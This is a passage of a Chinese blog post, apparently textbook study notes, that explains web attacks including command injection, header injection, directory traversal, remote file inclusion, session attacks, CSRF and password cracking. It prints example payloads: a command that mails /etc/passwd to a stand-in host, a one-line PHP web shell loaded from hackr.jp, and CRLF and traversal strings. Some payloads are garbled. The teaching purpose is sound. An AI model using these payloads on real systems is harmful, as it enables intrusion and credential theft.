<p>本案例中的问题仅仅是把未出版书籍的条目也一同显示出来了。 但实际发生 SQL注入攻击时，很有可能会导致用户信息或结算内容等其他数据表的非法浏览及篡改，从而使用户遭受不同程度的损失。</p>
<h4 id="os-命令注入攻击" tabindex="-1"><a class="header-anchor" href="#os-命令注入攻击" aria-hidden="true">#</a> OS 命令注入攻击</h4>
<p>OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行 非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地 方就有存在被攻击的风险。</p>
<p>可以从 Web 应用中通过 Shell 来调用操作系统命令。倘若调用 Shell 时存在疏漏，就可以执行插入的非法 OS 命令。</p>
<p>OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系 统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安 装着的各种程序。</p>
<ul>
<li>OS 注入攻击案例</li>
</ul>
<p>下面以咨询表单的发送功能为例，讲解 OS 注入攻击。该功能可 将用户的咨询邮件按已填写的对方邮箱地址发送过去。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808140021459.png" alt="image-20220808140021459"></p>
<p>下面摘选处理该表单内容的一部分核心代码。</p>
<div class="language-bash ext-sh line-numbers-mode"><pre v-pre class="language-bash"><code>my <span class="token variable">$adr</span> <span class="token operator">=</span> <span class="token variable">$q</span>-<span class="token operator">></span>param<span class="token punctuation">(</span><span class="token string">'mailaddress'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
open<span class="token punctuation">(</span>MAIL, <span class="token string">"| /usr/sbin/sendmail <span class="token variable">$adr</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print MAIL <span class="token string">"From: info@example.com<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮 件发送地址即 $adr 的值。</p>
<p>攻击者将下面的值指定作为邮件地址。</p>
<div class="language-bash ext-sh line-numbers-mode"><pre v-pre class="language-bash"><code><span class="token punctuation">;</span> <span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> mail hack@example.jp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>程序接收该值，构成以下的命令组合。</p>
<div class="language-bash ext-sh line-numbers-mode"><pre v-pre class="language-bash"><code><span class="token operator">|</span> /usr/sbin/sendmail <span class="token punctuation">;</span> <span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> mail hack@example.jp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。</p>
<p>可见，sendmail 命令执行被分隔后，接下去就会执行 cat /etc/passwd | mail hack@example.jp 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。</p>
<h4 id="http-首部注入攻击" tabindex="-1"><a class="header-anchor" href="#http-首部注入攻击" aria-hidden="true">#</a> HTTP 首部注入攻击</h4>
<p>HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应 首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。</p>
<p>向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP Response Splitting Attack）。</p>
<p>如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字 段 Location 和 Set-Cookie。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Location: http://www.example.com/a.cgi?q=12345
Set-Cookie: UID=12345
＊12345就是插入值
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出 值的地方，插入换行发动攻击。</p>
<p>HTTP 首部注入攻击有可能会造成以下一些影响。</p>
<ul>
<li>设置任何 Cookie 信息</li>
<li>重定向至任意 URL</li>
<li>显示任意的主体（HTTP 响应截断攻击）</li>
<li>HTTP 首部注入攻击案例</li>
</ul>
<p>下面我们以选定某个类别后即可跳转至各类别对应页面的功能为 例，讲解 HTTP 首部注入攻击。该功能为每个类别都设定了一个 类别 ID 值，一旦选定某类别，就会将该 ID 值反映在响应内的 Location 首部字段内，形如 Location: http://example.com/? cat=101。令浏览器发生重定 向跳转。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808143238355.png" alt="image-20220808143238355"></p>
<p>图：HTTP 首部注入攻击示例</p>
<p>攻击者以下面的内容替代之前的类别 ID 后发送请求。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>101%0D%0ASet-Cookie:+SID=123456789
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强 制将攻击者网站（http://hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。</p>
<p>发送该请求之后，假设结果返回以下响应。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Location: http://example.com/?cat=101（%0D%0A ：换行符）
Set-Cookie: SID=123456789
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意 的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会 话 ID）攻击组合，攻击者可伪装成用户。</p>
<p>攻击者输入的 %0D%0A，原本应该属于首部字段 Location 的查 询值部分，但经过解析后，%0D%0A 变成了换行符，结果插入 了新的首部字段。</p>
<p>这样一来，攻击者可在响应中插入任意的首部字段。</p>
<ul>
<li>
<p>HTTP 响应截断攻击</p>
<p>HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺 序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发 送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需 的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻 击叫做 HTTP 响应截断攻击。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>%0D%0A%0D%0A&lt;HTML>&lt;HEAD>&lt;TITLE>之后，想要显示的网页内容 &lt;!--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在可能进行 HTTP 首部注入的环节，通过发送上面的字符串，返 回结果得到以下这种响应。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Set-Cookie: UID=（%0D%0A ：换行符）
（%0D%0A ：换行符）
&lt;HTML>&lt;HEAD>&lt;TITLE>之后，想要显示的网页内容 &lt;!--（原来页面对应的首部
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ul>
<p>利用这个攻击，已触发陷阱的用户浏览器会显示伪造的 Web 页 面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。</p>
<p>另外，滥用 HTTP/1.1 中汇集多响应返回功能，会导致缓存服务 器对任意内容进行缓存操作。这种攻击称为缓存污染。使用该缓 存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替 换掉的 Web 网页。</p>
<h4 id="邮件首部注入攻击" tabindex="-1"><a class="header-anchor" href="#邮件首部注入攻击" aria-hidden="true">#</a> 邮件首部注入攻击</h4>
<p>邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功 能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的 攻击。利用存在安全漏洞的 Web 网站，可对任意邮件地址发送广告 邮件或病毒邮件。</p>
<ul>
<li>邮件首部注入攻击案例</li>
</ul>
<p>下面以 Web 页面中的咨询表单为例讲解邮件首部注入攻击。该 功能可在表单内填入咨询者的邮件地址及咨询内容后，以邮件的 形式发送给网站管理员。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808144654408.png" alt="image-20220808144654408"></p>
<p>图：邮件首部注入攻击案例</p>
<p>攻击者将以下数据作为邮件地址发起请求。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>bob@hackr.jp%OD%OABcc: user@example.com
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发 送，而这原本是无法指定的。</p>
<p>另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本 内容并发送。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>bob@hackr.jp0D号0A8OD%0ATest Message
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="目录遍历攻击" tabindex="-1"><a class="header-anchor" href="#目录遍历攻击" aria-hidden="true">#</a> 目录遍历攻击</h4>
<p>目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录， 通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有 时也称为路径遍历（Path Traversal）攻击。</p>
<p>通过 Web 应用对文件处理操作时，在由外部指定文件名的处理存在 疏漏的情况下，用户可使用 .../ 等相对路径定位到 /etc/passed 等绝对 路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这 样一来，就有可能非法浏览、篡改或删除 Web 服务器上的文件。</p>
<p>固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问 权限。</p>
<ul>
<li>目录遍历攻击案例</li>
</ul>
<p>下面以显示读取文件功能为例，讲解目录遍历攻击。该功能通过 以下查询字段，指定某个文件名。然后从 /www/log/ 文件目录下 读取这个指定的文件。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http://example.com/read.php?log=0401.log
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击者设置如下查询字段后发出请求。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http://example.com/read.php?log=../../etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>查询字段为了读取攻击者盯上的 /etc/passwd 文件，会从 /www/log/ 目录开始定位相对路径。如果这份 read.php 脚本接受 对指定目录的访问请求处理，那原本不公开的文件就存在可被访 问的风险。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808145344324.png" alt="image-20220808145344324"></p>
<p>图：目录遍历攻击案例</p>
<h4 id="远程文件包含漏洞" tabindex="-1"><a class="header-anchor" href="#远程文件包含漏洞" aria-hidden="true">#</a> 远程文件包含漏洞</h4>
<p>远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要 从其他文件读入时，攻击者利用指定外部服务器的 URL充当依赖文 件，让脚本读取之后，就可运行任意脚本的一种攻击。</p>
<p>这主要是 PHP 存在的安全漏洞，对 PHP 的 include 或 require 来说， 这是一种可通过设定，指定外部服务器的 URL作为文件名的功能。 但是，该功能太危险，PHP5.2.0 之后默认设定此功能无效。</p>
<p>固然存在输出值转义的问题，但更应控制对任意文件名的指定。</p>
<ul>
<li>远程文件包含漏洞的攻击案例</li>
</ul>
<p>下面以 include 读入由查询字段指定文件的功能为例，讲解远程 文件包含漏洞。该功能可通过以下查询字段形式指定文件名，并 在脚本内的 include 语句处读入这个指定文件。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http://example.com/foo.php?mod=news.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>对应脚本的源代码如下所示。</p>
<blockquote>
<p>http://example.com/foo.php 的源代码（部分摘录）</p>
</blockquote>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>$modname = $_GET['mod'];
include($modname);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>攻击者指定如同下面形式的 URL发出请求。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http://example.com/foo.php?mod=http://hackr.jp/cmd.php&amp;cmd=ls
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击者已事先在外部服务器上准备了以下这段脚本。</p>
<blockquote>
<p>http://hackr.jp/cmd.php 的源代码</p>
</blockquote>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;? system($_GET['cmd']) ?>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>假设 Web 服务器（example.com）的 include 可以引入外部服务器 的 URL，那就会读入攻击者在外部服务器上事先准备的 URL（http://hackr.jp/cmd.php）。结果，通过 system 函数就能在 Web 服务器（example.com）上执行查询字段指定的 OS 命令了。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808145852133.png" alt="image-20220808145852133"></p>
<p>图：远程文件包含漏洞的攻击案例</p>
<p>在以上攻击案例中，执行了可显示 Web 服务器（example.com） 上文件及目录信息的 ls 命令。</p>
<h3 id="因设置或设计上的缺陷引发的安全漏洞" tabindex="-1"><a class="header-anchor" href="#因设置或设计上的缺陷引发的安全漏洞" aria-hidden="true">#</a> 因设置或设计上的缺陷引发的安全漏洞</h3>
<p>因设置或设计上的缺陷引发的安全漏洞是指，错误设置 Web 服务 器，或是由设计上的一些问题引起的安全漏洞。</p>
<h4 id="强制浏览" tabindex="-1"><a class="header-anchor" href="#强制浏览" aria-hidden="true">#</a> 强制浏览</h4>
<p>强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器 的公开目录下的文件中，浏览那些原本非自愿公开的文件。</p>
<p>强制浏览有可能会造成以下一些影响。</p>
<ul>
<li>泄露顾客的个人信息等重要情报</li>
<li>泄露顾客的个人信息等重要情报</li>
<li>泄露未外连到外界的文件</li>
</ul>
<p>对那些原本不愿公开的文件，为了保证安全会隐蔽其 URL。可一旦知 道了那些 URL，也就意味着可浏览 URL对应的文件。直接显示容易 推测的文件名或文件目录索引时，通过某些方法可能会使 URL产生泄露。</p>
<p>文件目录一览</p>
<p>http://www.example.com/log/</p>
<p>通过指定文件目录名称，即可在文件一览中看到显示的文件名。</p>
<p>容易被推测的文件名及目录名</p>
<p>http://www.example.com/entry/entry_081202.log</p>
<p>文件名称容易推测（按上面的情况，可推出下一个文件是 entry_081203.log）</p>
<p>备份文件</p>
<p>http://www.example.com/cgi-bin/entry.cgi（原始文件）</p>
<p>http://www.example.com/cgi-bin/entry.cgi~（备份文件）</p>
<p>http://www.example.com/cgi-bin/entry.bak（备份文件）</p>
<p>由编辑软件自动生成的备份文件无执行权限，有可能直接以源代码形 式显示</p>
<p>经认证才可显示的文件</p>
<p>直接通过 URL访问原本必须经过认证才能在 Web 页面上使用的文件 （HTML文件、图片、PDF 等文档、CSS 以及其他数据等）</p>
<ul>
<li>强制浏览导致安全漏洞的案例</li>
</ul>
<p>下面我们以会员制度的 SNS 日记功能为例，讲解强制浏览可能导致 的安全漏洞。该日记功能保证了除具有访问权限的用户本人以外，其 他人都不能访问日记。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808150312437.png" alt="image-20220808150312437"></p>
<p>图：强制浏览导致安全漏洞的案例</p>
<p>该日记中包含的图像照片的源代码如下所示。</p>
<div class="language-html ext-html line-numbers-mode"><pre v-pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://example.com/img/tRNqSUBdG7Da.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>即使没有对这篇日记的访问权限，只要知道这图片的 URL，通过直接 指定 URL的方式就能显示该图片。日记的功能和文本具有访问对象 的控制，但不具备对图片访问对象的控制，从而产生了安全漏洞。</p>
<h4 id="不正确的错误消息处理" tabindex="-1"><a class="header-anchor" href="#不正确的错误消息处理" aria-hidden="true">#</a> 不正确的错误消息处理</h4>
<p>不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是 指，Web 应用的错误信息内包含对攻击者有用的信息。与 Web 应用 有关的主要错误信息如下所示。</p>
<ul>
<li>Web 应用抛出的错误消息</li>
<li>数据库等系统抛出的错误消息</li>
</ul>
<p>Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来 说，详细的错误消息有可能给他们下一次攻击以提示。</p>
<ul>
<li>不正确的错误消息处理导致安全漏洞的案例</li>
</ul>
<p>Web 应用抛出的错误消息</p>
<p>下面以认证功能的认证错误消息为例，讲解不正确的错误消息处理方式。该认证功能，在输入表单内的邮件地址及密码匹配发生错误时，会提示错误信息。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808150910513.png" alt="image-20220808150910513"></p>
<p>图：不正确的错误消息处理导致安全漏洞的案例</p>
<p>上方画面提示“邮件地址未注册”的错误消息。当输入的邮件地址 尚未在该 Web 网站上注册时，就会触发这条错误消息。因为倘 若邮件地址存在，应该会提示“输入的密码有误”之类的错误消 息。</p>
<p>攻击者利用进行不同的输入会提示不同的错误信息这条，就可用 来确认输入的邮件地址是否已在这个 Web 网站上注册过了。</p>
<p>为了不让错误消息给攻击者以启发，建议将提示消息的内容仅保 留到“认证错误”这种程度即可。</p>
<p>数据库等系统抛出的错误消息</p>
<p>下面我们以搜索功能提示的错误信息为例，讲解不正确的错误消 息处理。本功能用于检索数据，当输入未预料的字符串时，会提 示数据库的错误。</p>
<p>下面以认证功能的认证错误消息为例，讲解不正确的错误消息处 理。该认证功能在输入表单内的邮件地址及密码匹配发生错误 时，会提示错误信息。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808151106314.png" alt="image-20220808151106314"></p>
<p>图：不正确的错误消息处理导致安全漏洞的案例</p>
<p>上方的画面中显示了与 SQL有关的错误信息。对开发者而言， 该信息或许在 Debug 时会有帮助，但对用户毫无用处。</p>
<p>攻击者从这条消息中可读出数据库选用的是 MySQL，甚至还看 见了 SQL语句的片段。这可能给攻击者进行 SQL注入攻击以启 发。</p>
<p>系统抛出的错误主要集中在以下几个方面。</p>
<ul>
<li>PHP 或 ASP 等脚本错误</li>
<li>数据库或中间件的错误</li>
<li>Web 服务器的错误</li>
</ul>
<p>各系统应对详细的错误消息进行抑制设定，或使用自定义错误消 息，以避免某些错误信息给攻击者以启发。</p>
<h4 id="开放重定向" tabindex="-1"><a class="header-anchor" href="#开放重定向" aria-hidden="true">#</a> 开放重定向</h4>
<p>开放重定向（Open Redirect）是一种对指定的任意 URL作重定向跳转 的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网 站。</p>
<ul>
<li>开放重定向的攻击案例</li>
</ul>
<p>我们以下面的 URL做重定向为例，讲解开放重定向攻击案例。 该功能就是向 URL指定参数后，使本来的 URL发生重定向跳 转。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http://example.com/?redirect=http://www.tricorder.jp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>攻击者把重定向指定的参数改写成已设好陷阱的 Web 网站对应 的 连接，如下所示。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http: / l example.com/ ?redirect=http: //hackr.jp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>用户看到 URL后原以为访问 example.com，不料实际上被诱导至 hackr.jp 这个指定的重定向目标。</p>
<p>可信度高的 Web 网站如果开放重定向功能，则很有可能被攻击 者选中并用来作为钓鱼攻击的跳板。</p>
<h3 id="因会话管理疏忽引发的安全漏洞" tabindex="-1"><a class="header-anchor" href="#因会话管理疏忽引发的安全漏洞" aria-hidden="true">#</a> 因会话管理疏忽引发的安全漏洞</h3>
<p>会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有 所疏忽，就会导致用户的认证状态被窃取等后果。</p>
<h4 id="会话劫持" tabindex="-1"><a class="header-anchor" href="#会话劫持" aria-hidden="true">#</a> 会话劫持</h4>
<p>会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会 话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808152015022.png" alt="image-20220808152015022"></p>
<p>图：会话劫持</p>
<p>具备认证功能的 Web 应用，使用会话 ID 的会话管理机制，作为管理 认证状态的主流方式。会话 ID 中记录客户端的 Cookie 等信息，服务 器端将会话 ID 与认证状态进行一对一匹配管理。</p>
<p>下面列举了几种攻击者可获得会话 ID 的途径。</p>
<ul>
<li>通过非正规的生成方法推测会话 ID</li>
<li>通过窃听或 XSS 攻击盗取会话 ID</li>
<li>通过会话固定攻击（Session Fixation）强行获取会话 ID</li>
<li>会话劫持攻击案例</li>
</ul>
<p>下面我们以认证功能为例讲解会话劫持。这里的认证功能通过会话管理机制，会将成功认证的用户的会话 ID（SID）保存在用户 浏览器的 Cookie 中。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808152328809.png" alt="image-20220808152328809"></p>
<p>图：会话劫持攻击案例</p>
<p>攻击者在得知该 Web 网站存在可跨站攻击（XSS）的安全漏洞 后，就设置好用 JavaScript 脚本调用 document.cookie 以窃取 Cookie 信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击 者就能获取含有会话 ID 的 Cookie。</p>
<p>攻击者拿到用户的会话 ID 后，往自己的浏览器的 Cookie 中设置 该会话 ID，即可伪装成会话 ID 遭窃的用户，访问 Web 网站了。</p>
<h4 id="会话固定攻击" tabindex="-1"><a class="header-anchor" href="#会话固定攻击" aria-hidden="true">#</a> 会话固定攻击</h4>
<p>对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻 击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属 于被动攻击。</p>
<ul>
<li>会话固定攻击案例</li>
</ul>
<p>下面我们以认证功能为例讲解会话固定攻击。这个 Web 网站的 认证功能，会在认证前发布一个会话 ID，若认证成功，就会在 服务器内改变认证状态。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808152547485.png" alt="image-20220808152547485"></p>
<p>图：会话固定攻击案例</p>
<p>攻击者准备陷阱，先访问 Web 网站拿到会话 ID（SID=f5d1278e8109）。此刻，会话 ID 在服务器上的记录仍 是（未认证）状态。（步骤① ~ ②）</p>
<p>攻击者设置好强制用户使用该会话 ID 的陷阱，并等待用户拿着 这个会话 ID 前去认证。一旦用户触发陷阱并完成认证，会话 ID（SID=f5d1278e8109）在服务器上的状态（用户 A 已认证）就 会被记录下来。（步骤③）</p>
<p>攻击者设置好强制用户使用该会话 ID 的陷阱，并等待用户拿着 这个会话 ID 前去认证。一旦用户触发陷阱并完成认证，会话 ID（SID=f5d1278e8109）在服务器上的状态（用户 A 已认证）就 会被记录下来。（步骤③）</p>
<p><strong>Session Adoption</strong></p>
<p>Session Adoption 是指 PHP 或 ASP.NET 能够接收处理未知会话 ID 的功能。 恶意使用该功能便可跳过会话固定攻击的准备阶段，从 Web 网 站 获得发行的会话 ID 的步骤。即，攻击者可私自创建会话 ID 构成陷阱，中间件却会误以为该会话 ID 是未知会话 ID 而接受。</p>
<h4 id="跨站点请求伪造" tabindex="-1"><a class="header-anchor" href="#跨站点请求伪造" aria-hidden="true">#</a> 跨站点请求伪造</h4>
<p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信 息或设定信息等某些状态更新，属于被动攻击。</p>
<p>跨站点请求伪造有可能会造成以下等影响。</p>
<ul>
<li>利用已通过认证的用户权限更新设定信息等</li>
<li>利用已通过认证的用户权限购买商品</li>
<li>利用已通过认证的用户权限在留言板上发表言论</li>
<li>跨站点请求伪造的攻击案例</li>
</ul>
<p>下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808153214210.png" alt="image-20220808153214210"></p>
<p>图：跨站点请求伪造的攻击案例</p>
<p>在该留言板系统上，受害者用户 A 是已认证状态。它的浏览器 中的 Cookie 持有已认证的会话 ID（步骤①）。</p>
<p>攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户 A 的浏览器执行完陷阱中的 请求后，留言板上也就会留下那条评论（步骤②）。</p>
<p>触发陷阱之际，如果用户 A 尚未通过认证，则无法利用用户 A 的身份权限在留言板上发表内容。</p>
<h3 id="其他安全漏洞" tabindex="-1"><a class="header-anchor" href="#其他安全漏洞" aria-hidden="true">#</a> 其他安全漏洞</h3>
<h4 id="密码破解" tabindex="-1"><a class="header-anchor" href="#密码破解" aria-hidden="true">#</a> 密码破解</h4>
<p>密码破解攻击（Password Cracking）即算出密码，突破认证。攻击不 仅限于 Web 应用，还包括其他的系统（如 FTP 或 SSH 等），本节将 会讲解对具备认证功能的 Web 应用进行的密码破解。</p>
<p>密码破解有以下两种手段。</p>
<ul>
<li>通过网络的密码试错</li>
<li>对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）</li>
</ul>
<p>除去突破认证的攻击手段，还有 SQL注入攻击逃避认证，跨站脚本 攻击窃取密码信息等方法。</p>
<ul>
<li>
<p>通过网络进行密码试错</p>
<p>对 Web 应用提供的认证功能，通过网络尝试候选密码进行的一 种攻击。主要有以下两种方式。</p>
<ul>
<li>穷举法</li>
<li>字典攻击</li>
</ul>
<p><strong>穷举法</strong></p>
<p>穷举法（Brute-force Attack，又称暴力破解法）是指对所有密钥 集合构成的密钥空间（Keyspace）进行穷举。即，用所有可行的 候选密码对目标的密码系统试错，用以突破验证的一种攻击。</p>
<p>比如银行采用的个人识别码是由“4 位数字”组成的密码，那么就 要从 0000~9999 中的全部数字逐个进行尝试。这样一来，必定在 候选的密码集合中存在一个正确的密码，可通过认证。</p>
<p>因为穷举法会尝试所有的候选密码，所以是一种必然能够破解密 码的攻击。但是，当密钥空间很庞大时，解密可能需要花费数 年，甚至千年的时间，因此从现实角度考量，攻击是失败的。</p>
<p><strong>字典攻击</strong></p>
<p>字典攻击是指利用事先收集好的候选密码（经过各种组合方式后 存入字典），枚举字典中的密码，尝试通过认证的一种攻击手法。</p>
<p>还是举银行采用个人识别码是“4 位数字”的密码的例子，考虑到 用户使用自己的生日做密码的可能性较高，于是就可以把生日日 期数值化，如将 0101~1231 保存成字典，进行尝试。</p>
<p>与穷举法相比，由于需要尝试的候选密码较少，意味着攻击耗费 的时间比较短。但是，如果字典中没有正确的密码，那就无法破 解成功。因此攻击的成败取决于字典的内容。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808153911798.png" alt="image-20220808153911798"></p>
</li>
</ul>
<p>图：穷举法和字典攻击</p>
<blockquote>
<p>利用别处泄露的 ID·密码进行攻击</p>
<p>字典攻击中有一种利用其他 Web 网站已泄露的 ID 及密码列表 进行的攻击。很多用户习惯随意地在多个 Web 网站使用同一 套 ID 及密码，因此攻击会有相当高的成功几率。</p>
<p>根据警方的调查统计，成功入侵率有 6.7%。</p>
</blockquote>
<ul>
<li>对已加密密码的破解</li>
</ul>
<p>Web 应用在保存密码时，一般不会直接以明文的方式保存，通过 散列函数做散列处理或加 salt 的手段对要保存的密码本身加密。 那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这 些密码，则必须先通过解码等手段，把加密处理的密码还原成明 文形式。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808154122749.png" alt="image-20220808154122749"></p>
<p>图：破解已加密的密码</p>
<p>从加密过的数据中导出明文通常有以下几种方法。</p>
<ul>
<li>通过穷举法·字典攻击进行类推</li>
<li>彩虹表</li>
<li>拿到密钥</li>
<li>加密算法的漏洞</li>
</ul>
<p>通过穷举法·字典攻击进行类推</p>
<p>针对密码使用散列函数进行加密处理的情况，采用和穷举法或字 典攻击相同的手法，尝试调用相同的散列函数加密候选密码，然 后把计算出的散列值与目标散列值匹配，类推出密码。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808155602721.png" alt="image-20220808155602721"></p>
<p>图：破解已加密的密码 / 通过穷举法·字典攻击进行类推</p>
<p>彩虹表</p>
<p>彩虹表（Rainbow Table）是由明文密码及与之对应的散列值构成 的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举 法 • 字典攻击等实际破解过程中缩短消耗时间的技巧。从彩虹表 内搜索散列值就可以推导出对应的明文密码。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220808155656334.png" alt="image-20220808155656334"></p>
<p>图：破解已加密的密码 / 彩虹表</p>
<p>为了提高攻击成功率，拥有一张海量数据的彩虹表就成了必不可 少的条件。例如在 Free Rainbow Tables 网站上 （http://www.freerainbowtables.com/en/tables2/）公布的一张由大 小写字母及数字全排列的 1~8 位字符串对应的 MD5 散列值构成 的彩虹表，其大小约为 1050 吉字节。</p>
<p><strong>拿到密钥</strong></p>
<p>使用共享密钥加密方式对密码数据进行加密处理的情况下，如果 能通过某种手段拿到加密使用的密钥，也就可以对密码数据解密 了。</p>
<p><strong>加密算法的漏洞</strong></p>
